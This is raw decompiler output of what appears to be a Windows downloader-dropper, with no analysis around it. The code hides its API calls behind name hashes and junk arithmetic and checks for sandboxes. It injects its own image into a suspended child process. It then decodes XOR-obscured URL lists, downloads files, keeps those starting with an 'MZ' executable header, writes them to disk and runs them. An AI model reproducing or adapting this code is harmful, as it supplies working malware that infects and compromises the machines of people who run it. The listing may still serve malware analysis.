/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int start();
int __stdcall sub_4014B0(int a1, int a2);
int sub_4016BD();
int __stdcall sub_4019CA(int a1);
void __noreturn sub_401D2D(); // weak
int __cdecl sub_4021B8(int a1, int a2, int a3);
void __cdecl sub_402300(void *a1);
int __cdecl sub_402330(int a1, int a2, int a3, _DWORD *a4);
// int __usercall sub_402360@<eax>(int a1@<ebp>, int a2, unsigned int a3);
// int __userpurge sub_402429@<eax>(int result@<eax>, int a2@<ebp>, int a3);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// LPSTR __stdcall GetCommandLineA();
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall SetFileSecurityA(LPCSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40231C; // weak
_DWORD off_404000 = 4206876; // idb
_UNKNOWN off_404004; // weak
LPCSTR lpLibFileName = "kernel32.dll"; // idb
_DWORD off_40400C = 4206854; // idb
_DWORD off_404010 = 4206842; // idb
_UNKNOWN off_404014; // weak
_DWORD off_404018 = 4206836; // idb
_DWORD off_40401C = 4206831; // idb
_DWORD off_404020 = 4206829; // idb
_DWORD off_404024 = 4206825; // idb
_UNKNOWN off_404028; // weak
_DWORD off_40402C = 4206820; // idb
_DWORD off_404030 = 4206817; // idb
void *off_404034 = &unk_4030C2; // weak
_DWORD off_404038 = 4206781; // idb
_DWORD off_40403C = 4206778; // idb
void *off_404040 = &unk_403014; // weak
_UNKNOWN off_404044; // weak
_DWORD off_404048 = 4206604; // idb
_DWORD dword_40404C[4] = { 429065504, 0, 0, 0 }; // idb
int (__stdcall *dword_4041B8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041C0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041C4)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041C8)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041CC)(_DWORD) = NULL; // weak
int (__stdcall *dword_4041D0)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041D4)(_DWORD) = NULL; // weak
int (__stdcall *dword_4041D8)(_DWORD) = NULL; // weak
int (__stdcall *dword_4041DC)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041E0)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041E4)(_DWORD) = NULL; // weak
int (__stdcall *dword_4041E8)(_DWORD) = NULL; // weak
int (*dword_4041EC)(void) = NULL; // weak
int (__stdcall *dword_4041F0)(_DWORD) = NULL; // weak
int (__stdcall *dword_4041F4)(_DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4041FC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_404200)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404204)(_DWORD); // weak
int (__stdcall *dword_404208)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
CHAR Filename[260]; // idb
CHAR FileName[260]; // idb
int dword_404414; // weak
int dword_404440; // weak
__int16 word_404444; // weak
_UNKNOWN dword_404458; // weak
_UNKNOWN dword_40445C; // weak
int dword_404468; // weak
int dword_404520; // weak
char byte_404734[512]; // idb
char byte_404934[512]; // idb
_UNKNOWN unk_404B34; // weak
int dword_404D34[]; // weak


//----- (0040100B) --------------------------------------------------------
int start()
{
  HMODULE v0; // ebx
  int v1; // ebx
  int v2; // ebx
  int v3; // eax
  _DWORD v5[8]; // [esp+8h] [ebp-2Ch] BYREF
  unsigned int v6; // [esp+28h] [ebp-Ch]
  unsigned int v7; // [esp+2Ch] [ebp-8h]
  unsigned int v8; // [esp+30h] [ebp-4h]

  v0 = LoadLibraryA(lpLibFileName);
  v7 = (2 * v8 + 220) | (v6 + 1461);
  dword_4041B8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0((int)v0, 1685390295);
  v8 = (2 * v7 + 148) | (v6 + 2 * v7 + 5577);
  dword_4041BC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0((int)v0, -1191497290);
  v8 = (2 * v6) ^ (2 * v8) ^ (v8 + 38) | (2 * v6);
  dword_4041C0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0((int)v0, -1238262415);
  dword_4041C4 = (int (__stdcall *)(_DWORD, _DWORD))sub_4014B0((int)v0, -2007383445);
  v7 = (2 * v8) ^ (-2617 - v6);
  dword_4041C8 = (int (__stdcall *)(_DWORD, _DWORD))sub_4014B0((int)v0, -2007373205);
  dword_4041CC = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, -191089111);
  dword_4041D0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_4014B0((int)v0, -2042718272);
  v8 = v7 + 8 * v8 + 961;
  dword_4041D4 = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, 445514251);
  v6 = ((2 * v7) >> 16) ^ ((2 * v8 + 7141) << (2 * v8 + 9));
  dword_4041D8 = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, 1203243316);
  dword_4041DC = (int (__stdcall *)(_DWORD, _DWORD))sub_4014B0((int)v0, 1992264094);
  dword_4041E0 = (int (__stdcall *)(_DWORD, _DWORD))sub_4014B0((int)v0, 1992019742);
  v7 = ((2 * v6 + 2 * v7 + 597) << (2 * v7 - 95)) ^ (2 * v7);
  dword_4041E4 = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, 2002683038);
  v8 = (4 * v6 + 7039) | (2 * v7 + 217);
  dword_4041E8 = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, 1730943013);
  v6 = -2756 - 4 * v7;
  dword_4041EC = (int (*)(void))sub_4014B0((int)v0, 78561712);
  v7 = (v8 + 2121) << (8 * v6) >> (2 * v6 + 76);
  dword_4041F0 = (int (__stdcall *)(_DWORD))sub_4014B0((int)v0, 250534349);
  dword_4041E0(v5, off_404024);
  v6 = ((2 * v7 + 202) * (v7 + 4946)) & (v7 + 1350);
  dword_4041DC(v5, off_40403C);
  v7 = (4 * v6 - 4 * v8) & (2 * (v7 + v6) + 120);
  dword_4041DC(v5, off_404018);
  v8 = (2 * v6) & (v8 + 8768) | (2 * (v6 + v8) + 1751);
  dword_4041DC(v5, off_40400C);
  v7 = (2 * v8 + 2 * v8 - 2 * v6 + 10226) & (2 * v8 + 7938);
  v1 = dword_4041D8(v5);
  v7 = (2 * v7 + 4673) & (2 * v6 + 44) ^ (2 * v8 * (v8 + 476));
  dword_4041F4 = (int (__stdcall *)(_DWORD, _DWORD))sub_4014B0(v1, 1960359038);
  v7 = 0;
  dword_4041F8 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0(v1, -2111982395);
  v6 = 2 * v8 + 10 * v8 + 3093 + 78;
  dword_4041FC = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0(v1, -1707499742);
  v6 = 4 * v8 + 87;
  dword_404200 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0(v1, 946146086);
  v7 = (2 * v6 - 2 * v6 * 2 * v7) >> (2 * v8 + 47);
  dword_404204 = (int (__stdcall *)(_DWORD))sub_4014B0(v1, 998627677);
  v6 = (4 * v7) | (2 * v6 + 4 * v7 * 2 * v6);
  v2 = dword_4041D8(off_404010);
  v8 = 8 * v7 + 6214;
  dword_404208 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_4014B0(v2, -582008437);
  v6 = (2 * v6 + 16) >> (2 * v7 + 88 + (2 * v8 - 30) * (2 * v6 - 119));
  sub_4016BD();
  v3 = (4 * v7 - 4 * v8-- + 97) << (v6 + 9);
  v7 = v3 - 1;
  --v6;
  dword_4041D4(0);
  return 0;
}
// 4041B8: using guessed type int (__stdcall *dword_4041B8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041BC: using guessed type int (__stdcall *dword_4041BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041C0: using guessed type int (__stdcall *dword_4041C0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041C4: using guessed type int (__stdcall *dword_4041C4)(_DWORD, _DWORD);
// 4041C8: using guessed type int (__stdcall *dword_4041C8)(_DWORD, _DWORD);
// 4041CC: using guessed type int (__stdcall *dword_4041CC)(_DWORD);
// 4041D0: using guessed type int (__stdcall *dword_4041D0)(_DWORD, _DWORD, _DWORD);
// 4041D4: using guessed type int (__stdcall *dword_4041D4)(_DWORD);
// 4041D8: using guessed type int (__stdcall *dword_4041D8)(_DWORD);
// 4041DC: using guessed type int (__stdcall *dword_4041DC)(_DWORD, _DWORD);
// 4041E0: using guessed type int (__stdcall *dword_4041E0)(_DWORD, _DWORD);
// 4041E4: using guessed type int (__stdcall *dword_4041E4)(_DWORD);
// 4041E8: using guessed type int (__stdcall *dword_4041E8)(_DWORD);
// 4041EC: using guessed type int (*dword_4041EC)(void);
// 4041F0: using guessed type int (__stdcall *dword_4041F0)(_DWORD);
// 4041F4: using guessed type int (__stdcall *dword_4041F4)(_DWORD, _DWORD);
// 4041F8: using guessed type int (__stdcall *dword_4041F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041FC: using guessed type int (__stdcall *dword_4041FC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404200: using guessed type int (__stdcall *dword_404200)(_DWORD, _DWORD, _DWORD, _DWORD);
// 404204: using guessed type int (__stdcall *dword_404204)(_DWORD);
// 404208: using guessed type int (__stdcall *dword_404208)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004014B0) --------------------------------------------------------
int __stdcall sub_4014B0(int a1, int a2)
{
  int i; // esi
  unsigned int v3; // eax
  int j; // [esp+Ch] [ebp-38h]
  int v6; // [esp+10h] [ebp-34h]
  int v7; // [esp+18h] [ebp-2Ch]
  _DWORD *v8; // [esp+1Ch] [ebp-28h]
  unsigned int v9; // [esp+20h] [ebp-24h]

  v8 = (_DWORD *)(a1 + *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120));
  v7 = a1 + v8[9];
  if ( SetFileSecurityA(0, 0, 0) )
    a2 += 31220;
  if ( !SetFileSecurityA((LPCSTR)0x29A, 0, 0) )
    a2 += 812957;
  for ( i = 0; i < v8[6]; ++i )
  {
    v3 = 0;
    v9 = (2 * v9) ^ ((8 * v9) >> (-120 * v9));
    v6 = a1 + *(_DWORD *)(a1 + v8[8] + 4 * i);
    for ( j = 0; *(_BYTE *)(j + v6); ++j )
      v3 = *(char *)(j + v6) ^ 0x55 ^ (((unsigned __int64)v3 >> 25) | (v3 << 7));
    if ( v3 == a2 )
      return a1 + *(_DWORD *)(a1 + v8[7] + 4 * *(unsigned __int16 *)(v7 + 2 * i));
  }
  return 0;
}
// 4015DA: variable 'v9' is possibly undefined

//----- (004016BD) --------------------------------------------------------
int sub_4016BD()
{
  HMODULE v0; // ebx
  char *v1; // esi
  int v2; // eax
  char v4[4]; // [esp+Ch] [ebp-10h] BYREF
  int v5; // [esp+10h] [ebp-Ch]
  int v6; // [esp+14h] [ebp-8h]
  int v7; // [esp+18h] [ebp-4h]

  GetModuleFileNameA(0, Filename, 0x104u);
  dword_4041E0(FileName, off_404030);
  dword_4041DC(FileName, off_404000);
  dword_4041DC(FileName, off_40401C);
  dword_4041DC(FileName, off_404038);
  dword_4041DC(FileName, Filename);
  dword_404414 = 68;
  dword_404440 = 1;
  word_404444 = 2;
  dword_4041B8(0, FileName, 0, 0, 0, 4, 0, 0, &dword_404414, &dword_404458);
  v5 = 0;
  v0 = GetModuleHandleA(0);
  v7 = 0;
  v6 = 0;
  v1 = (char *)v0 + *((_DWORD *)v0 + 15);
  v5 = 0;
  v2 = dword_4041BC(dword_404458, v0, *((_DWORD *)v1 + 20), 12288, 64);
  v7 = 14127;
  dword_4041C0(dword_404458, v2, v0, *((_DWORD *)v1 + 20), v4);
  v6 = (2 * v7 + 104) << (v6 + 122);
  dword_404468 = 65543;
  v7 = 0;
  dword_4041C4(dword_40445C, &dword_404468);
  LOBYTE(v5) = (2 * (v7 + v5) + 65) & (8 * v7 - 52) ^ (2 * v7);
  dword_404520 = (int)sub_401D2D;
  v5 = ((v7 + 6556) << (2 * v5 * 2 * v6)) | (2 * v7);
  dword_4041C8(dword_40445C, &dword_404468);
  v6 = (v5 + 7397) ^ (2 * (v6 + v5) + 285);
  return dword_4041CC(dword_40445C);
}
// 401D2D: using guessed type void __noreturn sub_401D2D();
// 4041B8: using guessed type int (__stdcall *dword_4041B8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041BC: using guessed type int (__stdcall *dword_4041BC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041C0: using guessed type int (__stdcall *dword_4041C0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041C4: using guessed type int (__stdcall *dword_4041C4)(_DWORD, _DWORD);
// 4041C8: using guessed type int (__stdcall *dword_4041C8)(_DWORD, _DWORD);
// 4041CC: using guessed type int (__stdcall *dword_4041CC)(_DWORD);
// 4041DC: using guessed type int (__stdcall *dword_4041DC)(_DWORD, _DWORD);
// 4041E0: using guessed type int (__stdcall *dword_4041E0)(_DWORD, _DWORD);
// 404414: using guessed type int dword_404414;
// 404440: using guessed type int dword_404440;
// 404444: using guessed type __int16 word_404444;
// 404458: using guessed type int dword_404458;
// 40445C: using guessed type int dword_40445C;
// 404468: using guessed type int dword_404468;
// 404520: using guessed type int dword_404520;

//----- (004019CA) --------------------------------------------------------
int __stdcall sub_4019CA(int a1)
{
  int v1; // esi
  int v2; // edi
  HANDLE v3; // ebx
  int v5; // [esp+10h] [ebp-434h]
  int v6; // [esp+14h] [ebp-430h]
  int i; // [esp+18h] [ebp-42Ch]
  int v8; // [esp+20h] [ebp-424h]
  int v9; // [esp+28h] [ebp-41Ch]
  char Buffer[1024]; // [esp+2Ch] [ebp-418h] BYREF
  DWORD NumberOfBytesWritten; // [esp+42Ch] [ebp-18h] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+430h] [ebp-14h] BYREF
  int v13; // [esp+434h] [ebp-10h] BYREF
  unsigned int v14; // [esp+438h] [ebp-Ch]
  unsigned int v15; // [esp+43Ch] [ebp-8h]
  unsigned int v16; // [esp+440h] [ebp-4h]

  v14 = 0;
  v13 = 7;
  v1 = 0;
  if ( dword_4041F4(&v13, 0) )
  {
    v8 = dword_4041F8(0, 0, 0, 0, 0);
    v15 = (2 * v14 + 41) & ((2 * v16 + 2) >> (2 * v14)) | (2 * v16);
    v2 = dword_4041FC(v8, a1, 0, 0, 0x80000000, 0);
    v1 = 0;
    if ( v2 )
    {
      v14 = 2 * v16 + 4 * v15 - (v14 + 7556) * (2 * v16 + 4214) + 9713;
      for ( i = dword_4041E4(a1); i > 0; --i )
      {
        v16 = ((v15 + 3728) >> (2 * v14)) | (2 * v16 * (2 * v15 + 49));
        if ( *(_BYTE *)(i + a1) == 47 )
        {
          v9 = i + a1 + 1;
          break;
        }
      }
      dword_4041D0(off_404044, FileName, 260);
      v15 = ((v14 + 3163) * (2 * v15 + 254)) ^ (v15 + 763);
      dword_4041DC(FileName, off_404014[0]);
      v14 = (4 * v16) & (v14 + 4388) ^ (2 * v16);
      dword_4041DC(FileName, v9);
      v14 = (8 * v14 + 1273) * (v15 + 4456) * (8 * v14 + 7774);
      v3 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0, 0);
      v6 = 0;
      v5 = 0;
      do
      {
        dword_404200(v2, Buffer, 1024, &nNumberOfBytesToWrite);
        if ( !v5 )
        {
          v5 = 1;
          if ( Buffer[0] == 77 )
          {
            v5 = 1;
            if ( Buffer[1] == 90 )
            {
              v6 = 1;
              v5 = 1;
            }
          }
        }
        v15 = 4 * v16;
        WriteFile(v3, Buffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
        v15 = (2 * v14 + 35) & ((4 * v14 + 5528) << (2 * v15 * (v14 + 23)));
      }
      while ( nNumberOfBytesToWrite );
      CloseHandle(v3);
      v14 = (4 * v14 + 5515) << (v16 + 8 * v15 + 96) >> (v15 + 9);
      dword_4041E8(231);
      v15 = (8 * v15 + 112) & (8 * v16 + 7102);
      v1 = 0;
      if ( v6 )
      {
        dword_404208(0, off_404004[0], FileName, 0, 0, 8);
        v1 = 1;
      }
      v15 = 0;
    }
    dword_404204(v2);
    v14 = ((2 * v15) >> (8 * v14)) | (v15 + 1944);
    dword_404204(v8);
  }
  return v1;
}
// 401B66: variable 'v9' is possibly undefined
// 404004: using guessed type char *off_404004[7];
// 404014: using guessed type char *off_404014[3];
// 404044: using guessed type char *off_404044;
// 4041D0: using guessed type int (__stdcall *dword_4041D0)(_DWORD, _DWORD, _DWORD);
// 4041DC: using guessed type int (__stdcall *dword_4041DC)(_DWORD, _DWORD);
// 4041E4: using guessed type int (__stdcall *dword_4041E4)(_DWORD);
// 4041E8: using guessed type int (__stdcall *dword_4041E8)(_DWORD);
// 4041F4: using guessed type int (__stdcall *dword_4041F4)(_DWORD, _DWORD);
// 4041F8: using guessed type int (__stdcall *dword_4041F8)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4041FC: using guessed type int (__stdcall *dword_4041FC)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404200: using guessed type int (__stdcall *dword_404200)(_DWORD, _DWORD, _DWORD, _DWORD);
// 404204: using guessed type int (__stdcall *dword_404204)(_DWORD);
// 404208: using guessed type int (__stdcall *dword_404208)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401D2D) --------------------------------------------------------
void __noreturn sub_401D2D()
{
  LPSTR v0; // ebx
  LPSTR v1; // ebx
  int v2; // esi
  int v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // [esp+Ch] [ebp-4Ch]
  int v7; // [esp+14h] [ebp-44h]
  int v8; // [esp+18h] [ebp-40h]
  int v9; // [esp+1Ch] [ebp-3Ch]
  int v10; // [esp+20h] [ebp-38h]
  int v11; // [esp+24h] [ebp-34h]
  int v12; // [esp+28h] [ebp-30h]
  _DWORD v13[8]; // [esp+2Ch] [ebp-2Ch] BYREF
  unsigned int v14; // [esp+4Ch] [ebp-Ch]
  unsigned int v15; // [esp+50h] [ebp-8h]
  unsigned int v16; // [esp+54h] [ebp-4h]

  dword_4041E0(v13, off_404024);
  v14 = (4 * v15) ^ (8 * v16 * 8 * v15);
  dword_4041DC(v13, off_40403C);
  v16 = ((2 * v15 - 2 * v16) << (4 * v16 - 21)) | (8 * v16 + 7970);
  dword_4041DC(v13, off_404018);
  v16 = (v16 + 1701) & ((2 * v15) << (4 * v15));
  dword_4041DC(v13, off_40400C);
  v15 = ((4 * v15 + 149) >> (4 * v14 + 91) >> (4 * v16)) ^ (v14 + 4278);
  dword_4041D8(v13);
  v16 = ((v14 + 3736) * (8 * v14 + 2793) + 2 * v16) & (4 * v14 + 7928);
  dword_4041D8(off_404010[0]);
  v15 = (2 * v14 + 76) << (4 * v14);
  dword_4041EC();
  v14 = ((2 * v14 + 7339) >> (2 * v16)) & (8 * v16 + 9076);
  v0 = GetCommandLineA();
  v14 = (v15 + 8783) >> (4 * v14);
  while ( *v0 != 32 )
    ++v0;
  v1 = v0 + 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( v3 )
      break;
    v15 = (2 * v16 + 25) ^ (8 * v15 + 7334) & (2 * v16);
    dword_4041E8(269);
    v14 = (2 * v14) | (2 * v16 + 252);
    v3 = dword_4041F0(v1);
    ++v2;
  }
  while ( v2 <= 50 );
  v16 = (v16 - 2 * v15 + 4891) | (2 * v15 + 7598);
  v6 = 0;
  v4 = 0;
  v12 = 0;
  v5 = 0;
  do
  {
    byte_404734[v5] = *((_BYTE *)off_404040 + v6 + 1) ^ *((_BYTE *)off_404040 + v6);
    if ( byte_404734[v5] == 44 )
    {
      byte_404734[v5] = 0;
      ++v12;
      v11 = 0;
      do
      {
        v10 = 0;
        v9 = 0;
        v8 = 0;
        v7 = 0;
        do
        {
          byte_404934[v9] = *((_BYTE *)off_404034 + v10 + 1) ^ *((_BYTE *)off_404034 + v10);
          if ( byte_404934[v9] == 44 )
          {
            byte_404934[v9] = 0;
            dword_4041E0(&unk_404B34, off_404028);
            v16 = (8 * v14) | (4 * v15);
            dword_4041DC(&unk_404B34, off_404048);
            v16 = ((v16 + 9601) << (4 * v15 + 68)) | (2 * v15);
            dword_4041DC(&unk_404B34, off_40402C);
            v16 = ((4 * v16) << (2 * v15) << (2 * v15 + 67)) ^ (2 * v15);
            dword_4041DC(&unk_404B34, off_404020);
            v15 = ((8 * v14 + 1718) >> (2 * v15)) & ((2 * v15 + 147) * (v16 + 6804));
            dword_4041DC(&unk_404B34, off_404020);
            v14 = (8 * v16) & (2 * v16 + 185);
            dword_4041DC(&unk_404B34, byte_404734);
            v14 = (8 * v16 + 4975) | (4 * v16 + 8525) | (10 * v16 + 11521);
            dword_4041DC(&unk_404B34, off_404020);
            v15 = (4 * v16 + 5571) >> (8 * v15 - 109);
            dword_4041DC(&unk_404B34, byte_404934);
            if ( dword_404D34[v7] == 1 )
            {
              ++v8;
            }
            else if ( sub_4019CA((int)&unk_404B34) )
            {
              dword_404D34[v7] = 1;
              ++v8;
            }
            ++v7;
            v9 = -1;
          }
          ++v9;
          v10 += 3;
        }
        while ( v10 < 30 );
        if ( v8 == 1 )
          v4 = 1;
        ++v11;
        if ( !v4 )
          dword_4041E8(217779);
      }
      while ( v11 < 3 && !v4 );
      v5 = -1;
      if ( v4 )
        break;
    }
    ++v5;
    v6 += 3;
  }
  while ( v6 < 165 );
  v16 = v5;
  v15 = 1063842277;
  ++v14;
  ExitProcess(0);
}
// 401D2D: using guessed type void __noreturn sub_401D2D();
// 404010: using guessed type char *off_404010[4];
// 404024: using guessed type void *off_404024;
// 404028: using guessed type void *off_404028;
// 404034: using guessed type void *off_404034;
// 404040: using guessed type void *off_404040;
// 4041D8: using guessed type int (__stdcall *dword_4041D8)(_DWORD);
// 4041DC: using guessed type int (__stdcall *dword_4041DC)(_DWORD, _DWORD);
// 4041E0: using guessed type int (__stdcall *dword_4041E0)(_DWORD, _DWORD);
// 4041E8: using guessed type int (__stdcall *dword_4041E8)(_DWORD);
// 4041EC: using guessed type int (*dword_4041EC)(void);
// 4041F0: using guessed type int (__stdcall *dword_4041F0)(_DWORD);
// 404D34: using guessed type int dword_404D34[];

//----- (004021B8) --------------------------------------------------------
int __cdecl sub_4021B8(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_402360(a2 + 16, a2, 0xFFFFFFFF);
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *(_DWORD *)(a2 - 4) = v12;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
      if ( v7 )
      {
        v8 = v7(0, 0);
        v4 = v3[3];
        if ( v8 )
        {
          if ( v8 < 0 )
            return 0;
          v9 = *(_DWORD *)(v4 + 8);
          sub_402300((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_402360(v4 + 16, v4, v5);
          sub_402429(*(_DWORD *)(v9 + 12 * v5 + 8), v4 + 16, 1);
          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v9 + 4 * v10);
          v4 = 0;
          v5 = 0;
          (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 40227A: variable 'v10' is possibly undefined

//----- (00402300) --------------------------------------------------------
void __cdecl sub_402300(void *a1)
{
  RtlUnwind(a1, &loc_40231C, 0, 0);
}

//----- (00402330) --------------------------------------------------------
int __cdecl sub_402330(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (00402360) --------------------------------------------------------
int __usercall sub_402360@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_402330;
  v7 = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_402429(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        v7,
        v8);
    }
  }
  return result;
}
// 4023C7: variable 'v7' is possibly undefined
// 4023C7: variable 'v8' is possibly undefined

//----- (00402429) --------------------------------------------------------
int __userpurge sub_402429@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_40404C[2] = a3;
  dword_40404C[1] = result;
  dword_40404C[3] = a2;
  return result;
}

// nfuncs=11 queued=10 decompiled=10 lumina nreq=0 worse=0 better=0
// ALL OK, 10 function(s) have been successfully decompiled
